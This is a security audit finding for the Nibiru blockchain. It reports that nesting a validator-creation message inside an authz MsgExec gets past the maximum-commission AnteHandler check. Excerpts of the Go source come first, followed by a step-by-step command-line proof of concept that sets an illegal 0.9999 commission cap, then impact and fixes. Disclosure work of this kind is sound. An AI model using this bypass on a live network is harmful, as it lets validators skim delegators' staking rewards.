# #10: Vulnerability in app/ante/commission.go: Bypassing AnteHandler for Maximum Commission Validation via Nested MsgExec
Labels: ['bug', '3 (High Risk)', 'primary issue', 'sufficient quality report', 'unsatisfactory']
Accepted: True

I strongly recommend including this vulnerability in the audit scope, as it has the potential to impact the entire chain's economy.

The AnteDecoratorStakingCommission decorator is an AnteHandler used to validate and restrict the **maximum delegation commission (Commission)** set by validators before processing a transaction. If a validator attempts to set a commission rate exceeding the allowed maximum, the transaction is blocked. However, this validation can be bypassed using nested MsgExec.

### Code Analysis

AnteDecoratorStakingCommission performs validation for MsgCreateValidator and MsgEditValidator messages by checking the commission rate against the maximum allowed value.

https://github.com/code-423n4/2024-11-nibiru/blob/main/app/ante/commission.go#L22

```go
func (a AnteDecoratorStakingCommission) AnteHandle(
	ctx sdk.Context, tx sdk.Tx, simulate bool, next sdk.AnteHandler,
) (newCtx sdk.Context, err error) {
	for _, msg := range tx.GetMsgs() {
		switch msg := msg.(type) {
		case *stakingtypes.MsgCreateValidator:
			rate := msg.Commission.Rate
			if rate.GT(MAX_COMMISSION()) {
				return ctx, NewErrMaxValidatorCommission(rate)
			}
		case *stakingtypes.MsgEditValidator:
			rate := msg.CommissionRate
			if rate != nil && msg.CommissionRate.GT(MAX_COMMISSION()) {
				return ctx, NewErrMaxValidatorCommission(*rate)
			}
		default:
			continue
		}
	}
	return next(ctx, tx, simulate)
}
```

The MAX_COMMISSION() value ensures validators cannot set an unreasonably high commission rate (e.g., higher than 25%). However, this validation is bypassed if MsgCreateValidator or MsgEditValidator is wrapped inside a MsgExec.

Cosmos SDK modules such as x/gov, x/group, and x/authz support nested or embedded messages. In particular, the x/authz module allows one account (granter) to authorize another account (grantee) to execute specific messages on their behalf. When using MsgExec, the grantee can execute messages such as MsgCreateValidator without triggering the AnteDecoratorStakingCommission.

The AnteDecoratorAuthzGuard decorator is designed to intercept and block specific MsgExec operations, such as MsgEthereumTx, but does not validate for other message types like MsgCreateValidator.

https://github.com/code-423n4/2024-11-nibiru/blob/main/app/ante/authz_guard.go#L18

```go
func (rmd AnteDecoratorAuthzGuard) AnteHandle(
	ctx sdk.Context, tx sdk.Tx, simulate bool, next sdk.AnteHandler,
) (newCtx sdk.Context, err error) {
	for _, msg := range tx.GetMsgs() {
		// Reject MsgEthereumTx inside exec
		if msgExec, ok := msg.(*authz.MsgExec); ok {
			msgsInExec, err := msgExec.GetMessages()
			if err != nil {
				return ctx, errors.Wrapf(
					errortypes.ErrInvalidType,
					"failed getting exec messages %s", err,
				)
			}
			for _, msgInExec := range msgsInExec {
				if _, ok := msgInExec.(*evm.MsgEthereumTx); ok {
					return ctx, errors.Wrapf(
						errortypes.ErrInvalidType,
						"MsgEthereumTx needs to be contained within a tx with 'ExtensionOptionsEthereumTx' option",
					)
				}
			}
		}
	}
	return next(ctx, tx, simulate)
}
```

However, this logic fails to check for nested MsgCreateValidator or MsgEditValidator. As a result, the commission rate can be set to an illegal value using MsgExec.

### Proof of Concept

Step 1: Initialize the Node

**Set up the blockchain node** by generating the required configuration files (e.g., config.toml, genesis.json). Configure the node's identity and specify the blockchain it participates in.

```bash
nibid init gxh191 --chain-id nibiru-1
```

Step 2: Create a Validator Account

- Generate a local key pair to manage the validator account.
- Obtain the mnemonic and address to register the account on-chain.

```bash
nibid keys add validator
```

Example output:

```json
- address: nibi1rgxe7vp4z3dtyknm5fq4zl787w2wmxdx7y8flr
  name: validator
  pubkey: '{"@type":"/cosmos.crypto.secp256k1.PubKey","key":"AxwomLw08k8Xj7OtMtstU+JjublzamYdQJgPwzpv1yCE"}'
  type: local
```

Step 3: Grant Superuser Privileges

Grant the validator account superuser (sudo root) privileges to manage the chain.

```bash
nibid genesis add-sudo-root-account nibi1rgxe7vp4z3dtyknm5fq4zl787w2wmxdx7y8flr
```

Step 4: Allocate Initial Funds to the Validator

Assign 1,000 UNIBI tokens to the validator account to cover future operations like creating validators and paying transaction fees.

```bash
nibid genesis add-genesis-account nibi1rgxe7vp4z3dtyknm5fq4zl787w2wmxdx7y8flr 1000000000unibi
```

Step 5: Generate a Genesis Validator Transaction

Generate a genesis transaction for the validator and submit the self-delegation amount to enable participation in the blockchain consensus.

```bash
nibid genesis gentx validator 100000000unibi --chain-id nibiru-1
```

Step 6: Merge Genesis Transactions

Include the validator's genesis transaction in the genesis.json file to ensure the validator's details are recorded.

```bash
nibid genesis collect-gentxs
```

### Step 7: Validate the Genesis File

Check the integrity of genesis.json to ensure the configuration is valid, preventing startup issues.

```bash
nibid genesis validate-genesis
```

### Step 8: Start the Node

```bash
nibid start
```

At this point, the node is running and ready for further exploitation.

Step 9: Create a New Delegator Account

Create another local account (grantee) to simulate a malicious user or a delegator account.

```bash
nibid keys add grantee
```

Example output:

```json
- address: nibi1sux6qyw3a57epqnzusvmrzge8fnn9hu242ppnf
  name: grantee
  pubkey: '{"@type":"/cosmos.crypto.secp256k1.PubKey","key":"AtuFuTxLgW47pbrA4M87mh2frrfohip0b3V9D5igkGg4"}'
  type: local
```

Step 10: Transfer Funds to the Delegator Account

Send 500 UNIBI to the grantee account to enable it to perform operations.

```bash
nibid tx bank send nibi1rgxe7vp4z3dtyknm5fq4zl787w2wmxdx7y8flr nibi1sux6qyw3a57epqnzusvmrzge8fnn9hu242ppnf 500000000unibi \
  --chain-id=nibiru-1 \
  --fees=500unibi
```

Step 11: Reconfigure the Tendermint Environment for the New Validator

Reinitialize the Tendermint environment for the new validator.

```bash
rm ~/.nibid/config/priv_validator_key.json
nibid init gxh191 --chain-id nibiru-1 --overwrite
```

Step 12: Retrieve the Tendermint Public Key

```bash
nibid tendermint show-validator
```

Example output:

```json
{"@type":"/cosmos.crypto.ed25519.PubKey","key":"S+VQRu+OTLL6326XR1ly7aF3VrtjA6KU3rkkQ9RMKTI="}
```

Step 13: Generate a Validator Creation Transaction

Create a MsgCreateValidator transaction and save it as create_validator_tx.json.

```bash
nibid tx staking create-validator \
  --amount=100000000unibi \
  --pubkey='{"@type":"/cosmos.crypto.ed25519.PubKey","key":"S+VQRu+OTLL6326XR1ly7aF3VrtjA6KU3rkkQ9RMKTI="}' \
  --moniker="gxh191" \
  --commission-rate="0.1" \
  --commission-max-rate="0.2" \ # <----------
  --commission-max-change-rate="0.01" \
  --min-self-delegation="1" \
  --from=nibi1sux6qyw3a57epqnzusvmrzge8fnn9hu242ppnf \
  --chain-id=nibiru-1 \
  --fees=500unibi \
  --generate-only > create_validator_tx.json
```

Step 14: Modify the Commission Rate

Manually edit the max_rate field in create_validator_tx.json to an illegal value, such as 0.9999.

```json
"commission": {
    "rate": "0.100000000000000000",
    "max_rate": "0.999900000000000000",  // <----------
    "max_change_rate": "0.010000000000000000"
},
```

---

Step 15: Execute the Validator Creation Transaction

Wrap the MsgCreateValidator in a MsgExec to bypass the AnteHandler check for the max_rate field.

```bash
nibid tx authz exec create_validator_tx.json \
  --from=nibi1sux6qyw3a57epqnzusvmrzge8fnn9hu242ppnf \
  --chain-id=nibiru-1 \
  --fees=500unibi
```

---

Step 16: Query Validator Details

Confirm that the max_rate exceeds the limit of 0.25 and is now set to the illegal value 0.9999.

```bash
nibid query staking validators --node tcp://localhost:26657
```

Example output:

```yaml
commission:
  commission_rates:
    max_change_rate: "0.010000000000000000"
    max_rate: "0.999900000000000000"  # <----------
    rate: "0.100000000000000000"
  update_time: "2024-11-17T15:02:58.413062Z"
```

This confirms the successful bypass of the AnteHandler restriction.

### Impact

1. **Severe Exploitation of Delegators**:
    - Validators can extract 99% of delegators’ rewards, leaving them with minimal returns.
    - This undermines trust in the network, discouraging staking and reducing overall security.
2. **Economic Incentive Disruption**:
    - Malicious validators could gain an unfair advantage by misleading delegators into staking with them, disrupting the reward distribution mechanism.
3. **Network Security Threat**:
    - A malicious validator controlling substantial staking weight could threaten the network’s Byzantine Fault Tolerance (BFT), risking consensus integrity.
4. **Reputation Damage**:
    - Delegators suffering financial loss may file lawsuits or withdraw from the network, tarnishing its reputation.

### Suggested Fix

1. **Expand AnteDecoratorAuthzGuard**:
    - Include checks for nested MsgCreateValidator and MsgEditValidator within MsgExec.
2. **Restrict Message Types in Authz**:
    - Only allow a predefined set of message types within MsgExec.
3. **Temporary Mitigation**:
    - If immediate fixes are impractical, consider disabling the authz module entirely.